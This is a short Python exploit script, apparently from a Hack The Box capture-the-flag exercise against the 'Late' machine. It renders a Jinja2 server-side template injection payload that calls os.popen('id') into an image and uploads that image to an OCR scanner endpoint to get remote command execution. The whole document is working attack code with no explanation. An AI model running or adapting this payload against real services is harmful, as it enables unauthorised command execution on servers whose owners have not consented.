# In[1]:
import re
import requests
import io
from PIL import Image
from PIL import ImageFont
from PIL import ImageDraw 


url = "http://images.late.htb"

# generate img
img = Image.open("img/arch1.jpg")
draw = ImageDraw.Draw(img)
font = ImageFont.truetype("font/consolaz.ttf", 30)
draw.text((10, 250),""" {{ config.__class__.__init__.__globals__['os'].popen(' id ').read()}}""",(1,1,1),font=font)

img.save('img/bb2-out.jpg')
# img.show() 

# send img
image = open('img/bb2-out.jpg','rb').read()
filename = "Arch.png"
files ={"file":(filename,image)}

r = requests.post(url+"/scanner", files = files)

print(r.text)



















